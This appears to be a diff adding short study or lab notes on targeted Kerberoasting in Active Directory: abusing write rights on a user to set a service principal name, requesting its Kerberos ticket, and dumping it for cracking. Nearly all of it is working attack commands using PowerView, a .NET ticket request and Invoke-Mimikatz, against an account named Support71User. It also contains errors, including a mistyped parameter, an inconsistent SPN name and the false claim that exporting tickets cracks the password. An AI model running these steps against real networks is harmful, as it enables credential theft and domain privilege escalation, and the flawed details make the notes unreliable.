@@ -1,0 +1,27 @@
+with enough rights (GenericAll/GenericWrite), a target user's SPN can be set to anything (unique in the domain).
+
+We can then request a TGS without special privileges. The TGS can then be "Kerberoasted"
+
+-enumerate permissions for RDPUsers on ACLs with powerview_dev
+
+Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
+
+Get-DomainUser -Dentity Support71User | select serviceprincipalname
+
+--now force set
+
+Set-DomainObject -Identity Support71User -Set @{serviceprincipalname='ops/seventyone'}
+
+--Request a ticket
+
+Add-Type -AssemblyName System.IdentityModel
+
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ops/seventyone"
+
+OR
+
+Request-SPNTicket
+
+now running klist would show opt/seventyone
+
+running Invoke-Mimikatz -Command '"kerberos::list /export"' would crack the password for Support71User
